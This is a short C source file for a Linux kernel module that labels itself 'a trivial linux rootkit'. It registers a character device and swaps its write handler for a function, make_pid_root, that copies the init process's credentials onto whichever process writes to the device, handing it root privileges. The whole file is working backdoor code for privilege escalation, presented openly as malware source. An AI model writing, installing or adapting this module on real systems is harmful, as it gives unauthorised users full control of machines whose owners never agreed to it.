/**
 * Linux rootkit kernel module
 * Copyright (C) 2014 Ng Tzy Luen. All Rights Reserved.
 *
 * Tested under GNU C gcc 4.7.2, linux kernel v3.14.3-x86_64
 */
#include <linux/module.h>
#include <linux/cdev.h>
#include <linux/input.h>
#include <linux/raw.h>
#include <linux/kernel.h>
#include <linux/sched.h>
#include <asm/uaccess.h>

#define EXIT_SUCCESS    0
#define DEV_MAJOR       79
#define DEV_MINOR       0

MODULE_AUTHOR("TzyLuen Ng <tzyluen.ng@gmail.com>");
MODULE_DESCRIPTION("a trivial linux rootkit");
MODULE_LICENSE("GPL");

static int stealth_dev_major;
static struct class *stealth_class;
static struct cdev stealth_cdev;
static struct file_operations stealth_fops, handler_fops;
static dev_t stealth_dev;


static ssize_t make_pid_root(
    struct file *filp,
    const char __user *buff,
    size_t len,
    loff_t *loff)
{
    struct task_struct *init_task = pid_task(find_vpid(1), PIDTYPE_PID);
    if (!init_task || !current)
        return 1;
    current->cred = init_task->cred;

    return 1;
}


void install_rootkit(struct cdev *dev, struct file_operations *fops)
{
    handler_fops.write = make_pid_root;
    dev->ops = &handler_fops;
}


static int stealth_init(void)
{
    int ret;
    if (DEV_MAJOR) {
        stealth_dev = MKDEV(DEV_MAJOR, DEV_MINOR);
        ret = register_chrdev_region(stealth_dev, MAX_RAW_MINORS,
                THIS_MODULE->name);
        if (ret) 
            return -ENOMEM;
    } else {
        ret = alloc_chrdev_region(&stealth_dev, DEV_MINOR, MAX_RAW_MINORS,
                THIS_MODULE->name);
        stealth_dev_major = MAJOR(stealth_dev);
    }

    cdev_init(&stealth_cdev, &stealth_fops);
    ret = cdev_add(&stealth_cdev, stealth_dev, MAX_RAW_MINORS);
    if (ret)
        return -ENOMEM;

    install_rootkit(&stealth_cdev, &stealth_fops);

    return EXIT_SUCCESS;
}


static void stealth_exit(void)
{
    device_destroy(stealth_class, MKDEV(DEV_MAJOR, 0));
    class_destroy(stealth_class);
    cdev_del(&stealth_cdev);
    unregister_chrdev_region(MKDEV(DEV_MAJOR, 0), MAX_RAW_MINORS);
}


module_init(stealth_init);
module_exit(stealth_exit);
